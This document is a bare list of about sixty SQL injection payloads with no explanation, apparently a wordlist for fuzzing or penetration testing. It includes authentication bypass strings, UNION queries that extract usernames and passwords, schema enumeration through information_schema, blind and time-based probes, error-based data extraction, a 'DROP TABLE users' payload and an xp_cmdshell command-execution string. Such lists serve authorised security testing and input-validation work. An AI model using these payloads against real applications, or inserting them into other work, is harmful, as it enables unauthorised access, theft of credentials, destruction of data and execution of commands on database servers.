' OR '1'='1
" OR 1=1 --
admin' --
' OR 'x'='x
' OR 1=1#
' OR 1=1--
' OR 1=1/*
' OR '1'='1' --
OR 1=1
' UNION SELECT NULL,NULL,NULL --
' OR EXISTS(SELECT * FROM users WHERE username='admin') --
' OR SLEEP(5)--
'; EXEC xp_cmdshell('dir');--
' AND 1=1
' AND 1=2
' OR ''='
' OR 1=1 LIMIT 1--
' OR 'unusual'='unusual
1' or '1' = '1
' AND email IS NOT NULL --
'; DROP TABLE users;--
admin'--
' UNION SELECT username,password FROM users--
' AND EXISTS(SELECT * FROM users WHERE username='admin')--
1 AND 1=1
1 AND 1=2
admin' AND '1'='1
' OR 1=CONVERT(int, (SELECT @@version))--
' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>90 --
' OR updatexml(null,concat(0x3a,(SELECT user())),null)--
' OR extractvalue(1,concat(0x7e,(SELECT database())))--
' OR 1=1 ORDER BY 1--
' ORDER BY 1--
' OR LENGTH(user())=8--
' OR MID(user(),1,1)='r'--
' OR user() LIKE 'root%'--
' UNION SELECT table_name,null FROM information_schema.tables--
' UNION SELECT column_name,null FROM information_schema.columns--
' OR (SELECT COUNT(*) FROM users) > 0 --
' AND (SELECT 1 FROM dual WHERE EXISTS (SELECT * FROM users)) --
' AND 1=CAST((SELECT @@version) AS INT)--
' UNION SELECT NULL,NULL,NULL--
' AND 1=(SELECT COUNT(*) FROM tablename)--
' AND SUBSTRING(@@version,1,1)='5'--
' AND (SELECT LENGTH(database()))>5 --
' AND ASCII(SUBSTRING(database(),1,1))=115 --
' AND EXISTS(SELECT * FROM admin) --
' OR 1=1 AND ''='
' AND 1=1 AND 1=1--
' AND 1=2 UNION SELECT null,null--
' OR NOT 1=0--
' AND name LIKE '%admin%'
' OR 1=1 UNION SELECT username,password FROM users--
' UNION SELECT NULL,version()--
' AND 1=(SELECT LENGTH(user()))--
' OR EXISTS(SELECT * FROM information_schema.tables)--
' AND 1=1 UNION ALL SELECT NULL,NULL,NULL--
' AND EXISTS(SELECT * FROM mysql.user)--
' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --
' OR 1=1 AND SLEEP(5)--
' OR BENCHMARK(1000000,MD5('test'))--
